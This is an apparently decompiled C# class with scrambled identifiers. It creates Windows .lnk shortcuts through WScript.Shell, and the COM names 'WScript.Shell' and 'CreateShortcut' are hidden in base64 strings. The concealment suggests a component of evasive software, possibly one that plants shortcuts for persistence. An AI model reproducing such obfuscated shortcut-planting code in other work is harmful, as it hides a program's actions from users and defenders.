using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace WvdSzXINIqX;

public sealed class eDRWnloHopvnkH
{
	[ComImport]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	[TypeLibType(4160)]
	private interface DTHRHwMGEvUT
	{
		[DispId(0)]
		string sQBisVKUJGfd
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string gpSuFTzABYo
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string MtZjEwbzqz
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string ebthUOTRLmP
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string kfRTGthbmJvcFX
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string XwTeMeokdMbcuMx
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string SthBENhXnlWF
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int aZuvNYqvRMm
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string dWesOMCBweboqsbU
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type GrBJmVSHxZFiA = Type.GetTypeFromProgID(JenwHsdeeXa.XKJIixIieoUFn("V1NjcmlwdC5TaGVsbA=="));

	private static object hEhvluJAWpkQX = Activator.CreateInstance(GrBJmVSHxZFiA);

	public static void rPeDkwFjXbIRt(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			DTHRHwMGEvUT dTHRHwMGEvUT = (DTHRHwMGEvUT)GrBJmVSHxZFiA.InvokeMember(JenwHsdeeXa.XKJIixIieoUFn("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, hEhvluJAWpkQX, new object[1] { string_0 });
			dTHRHwMGEvUT.MtZjEwbzqz = string_4;
			dTHRHwMGEvUT.ebthUOTRLmP = string_5;
			dTHRHwMGEvUT.SthBENhXnlWF = string_1;
			dTHRHwMGEvUT.dWesOMCBweboqsbU = string_3;
			dTHRHwMGEvUT.gpSuFTzABYo = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				dTHRHwMGEvUT.kfRTGthbmJvcFX = string_6;
			}
			dTHRHwMGEvUT.Save();
		}
		catch (Exception ex)
		{
			if (JenwHsdeeXa.HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(JenwHsdeeXa.kCftkBXDnujA, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
